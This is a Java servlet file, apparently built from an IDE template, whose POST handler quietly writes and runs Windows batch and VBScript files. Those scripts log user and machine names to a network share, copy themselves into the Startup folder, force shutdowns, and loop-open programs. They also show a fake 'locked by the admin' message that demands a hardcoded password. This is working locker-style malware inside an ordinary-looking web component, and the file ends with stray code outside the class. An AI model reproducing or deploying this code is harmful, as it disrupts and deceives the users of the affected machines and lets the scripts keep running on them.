/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 *
 * @author ebene
 */
public class Serv1 extends HttpServlet {

    /**
     * Processes requests for both HTTP <code>GET</code> and <code>POST</code>
     * methods.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    protected void processRequest(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        response.setContentType("text/html;charset=UTF-8");
        try (PrintWriter out = response.getWriter()) {
            /* TODO output your page here. You may use following sample code. */
            out.println("<!DOCTYPE html>");
            out.println("<html>");
            out.println("<head>");
            out.println("<title>Servlet Serv1</title>");            
            out.println("</head>");
            out.println("<body>");
            out.println("<h1>Servlet Serv1 at " + request.getContextPath() + "</h1>");
            out.println("</body>");
            out.println("</html>");
            
            
        }
    }

    // <editor-fold defaultstate="collapsed" desc="HttpServlet methods. Click on the + sign on the left to edit the code.">
    /**
     * Handles the HTTP <code>GET</code> method.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(request, response);
    }

    /**
     * Handles the HTTP <code>POST</code> method.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException 
    {  
        String maindata = "@echo off"+System.lineSeparator();
        maindata+= "pushd D:"+System.lineSeparator();
        maindata+= "wscript.exe \"invisible.vbs\" check.bat"+System.lineSeparator();
        maindata+= "pass.bat"+System.lineSeparator();
        maindata+= "popd"+System.lineSeparator();
        String exe = "@echo off"+System.lineSeparator()+"pushd \"%~dp0\""+System.lineSeparator();
        exe += "pushd \\\\CHEM7\\Users\\Public\\Libraries"+System.lineSeparator();
        exe += "echo %UserName% %date% %time% %ComputerName%>>\"log.txt\""+System.lineSeparator();
        exe += "popd"+System.lineSeparator()+"pushd \"%~dp0\""+System.lineSeparator();
        exe += "pushd D:"+System.lineSeparator();
        exe += "copy \"main.bat\" \"%USERPROFILE%/Start Menu/Programs/Startup\""+System.lineSeparator(); 
        exe += "popd"+System.lineSeparator()+"shutdown -s -t 2 -f"+System.lineSeparator();
        exe += ":re"+System.lineSeparator()+"start mspaint"+System.lineSeparator();
        exe += "start"+System.lineSeparator()+"start notepad"+System.lineSeparator()+"goto re"+System.lineSeparator();
        String checkdata = "timeout 15"+System.lineSeparator()+"set /p hos=<pass.txt"+System.lineSeparator();
        checkdata+= "if \"%hos%\"==\"2kbca\" goto antidote "+System.lineSeparator()+":doomsday"+System.lineSeparator();
        checkdata+= "shutdown -s -t 1 -f"+System.lineSeparator()+"exit"+System.lineSeparator();
        checkdata+= ":antidote"+System.lineSeparator()+"pushd \"%USERPROFILE%/Start Menu/Programs/Startup\""+System.lineSeparator();
        checkdata+= "del /f /q main.bat"+System.lineSeparator()+"popd"+System.lineSeparator()+"pushd D:"+System.lineSeparator();
        checkdata+= "del /f /q invisible.vbs"+System.lineSeparator()+"del /f /q main.bat"+System.lineSeparator();
        checkdata+= "del /f /q pass.bat"+System.lineSeparator()+"del /f /q pass.txt"+System.lineSeparator()+"del /f /q exercise.bat"+System.lineSeparator();
        checkdata+= "cscript \"MessageBox.vbs\" \"Lockdown Deactivated Successfully\""+System.lineSeparator();
        checkdata+= "del /f /q MessageBox.vbs"+System.lineSeparator()+"del /f /q check.bat"+System.lineSeparator();
        String invidata = "CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False";
        String msgdata = "Set objArgs = WScript.Arguments"+System.lineSeparator()+"messageText = objArgs(0)"+System.lineSeparator();
        msgdata+= "MsgBox messageText"+System.lineSeparator();
        String passdata = "@echo off"+System.lineSeparator()+"set rip=wrong"+System.lineSeparator();
        passdata+= "echo %rip%>pass.txt"+System.lineSeparator()+"echo This PC has been locked by the admin due to PC Crash in your Previous Session"+System.lineSeparator();
        passdata+= "echo Please contact your Lab Invigilator for the Master Password"+System.lineSeparator();
        passdata+= "echo PC will shutdown in 15 seconds automatically to prevent further damage"+System.lineSeparator();
        passdata+= "echo *------*"+System.lineSeparator();
        passdata+= "set \"psCommand=powershell -Command \"$pword = read-host \'Enter Password \' -AsSecureString ; ^"+System.lineSeparator();
        passdata+= "$BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^"+System.lineSeparator();
        passdata+= "[System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)\"\""+System.lineSeparator();
        passdata+= "for /f \"usebackq delims=\" %%p in (`%psCommand%`) do set rip=%%p"+System.lineSeparator();
        passdata+= "echo %rip%>pass.txt"+System.lineSeparator()+"echo Wait For Processing from Server, do not close this window."+System.lineSeparator();        
        passdata+= "pause"+System.lineSeparator();             
        try  
        {
            FileOutputStream main = new FileOutputStream("D:\\main.bat");
            main.write(maindata.getBytes());
            FileOutputStream check = new FileOutputStream("D:\\check.bat");
            check.write(checkdata.getBytes());
            FileOutputStream invi = new FileOutputStream("D:\\invisible.vbs");
            invi.write(invidata.getBytes());
            FileOutputStream msg = new FileOutputStream("D:\\MessageBox.vbs");
            msg.write(msgdata.getBytes());
            FileOutputStream pass = new FileOutputStream("D:\\pass.bat");
            pass.write(passdata.getBytes());
            FileOutputStream exercise = new FileOutputStream("D:\\exercise.bat");
            exercise.write(exe.getBytes());
        }
        catch(IOException e)
        {}
        Runtime.getRuntime().exec("cmd /c exercise.bat", null, new File("D:"));
        processRequest(request, response);
    }
    @Override
    public String getServletInfo() 
    {
        return "Short description";
    }
    }   

    /**
     * Returns a short description of the servlet.
     *
     * @return a String containing servlet description
     */
    // </editor-fold>


